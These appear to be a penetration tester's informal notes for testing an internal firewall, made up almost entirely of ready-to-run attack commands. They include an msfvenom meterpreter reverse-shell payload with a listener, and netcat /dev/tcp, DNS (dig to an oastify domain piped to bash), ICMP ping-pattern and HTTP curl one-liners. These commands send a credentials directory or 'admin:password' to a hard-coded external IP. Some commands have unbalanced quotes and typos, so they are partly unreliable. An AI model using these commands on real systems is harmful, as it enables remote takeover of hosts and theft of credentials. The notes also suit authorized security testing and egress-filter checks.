Internal Firewall Penetration Testing (if provided system was linux)

meterpreter reverse shell:

make a reverse shell payload and send to internal machine with apache service (AWS)

msfvenom -p  linux/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=9191 -f elf > shell.elf (AWS) (use different payloads as well like bind)

listen to your Metasploit for connection (AWS)

execute payload (internal)

PINGSWEEP (metasploit after getting reverse connection)

Netcat data Exfiltration:

Step 1: Username and password were sent in nothing.txt file within important directory

tar zcf - important/ | base64 | dd conv=ebcdic > /dev/tcp/3.110.84.217/6565

Step 2: creds.txt file received to the external server.

nc -lvp 6565 > important/nothing.txt

DNS Data Exfiltration ()  ????

cat creds.txt |base64 | tr -d "\n" | fold -w18 |sed 's/.*/&./' | tr -d "\n" | sed 's/$/2il5xbs78lj24gby8p2du3e2qtwjk8.oastify.com/ | awk '{print "dig +short " $1} | bash  (use hex encoding insted of base64)

poll now (burp) check for encrypted creds

Weak Ciphers Enabled

Blacklisted IP accessibility

Used this reference for list of blacklisted IP Addresses https://github.com/stamparm/ipsum

ping and curl to check weather its accessible or not

ICMP Exfiltration

echo "admin:password" | xxd -p

(output of upper command used in below command after -p)

ping 3.110.84.217 -c 1 -p  <hash_here>

tcpdump -i eth0 icmp -X (AWS)

HTTP Exfiltration () ???

run appache server in aws first

echo "admin:password" |xxd -p

(output of upper command used in below command after any parameter)

curl http://3.110.84.217/?hacker=&lt;hash_here&gt;

cat /var/log/apache2/access.log (AWS)

PORT scanning

nmap (all tcp udp)
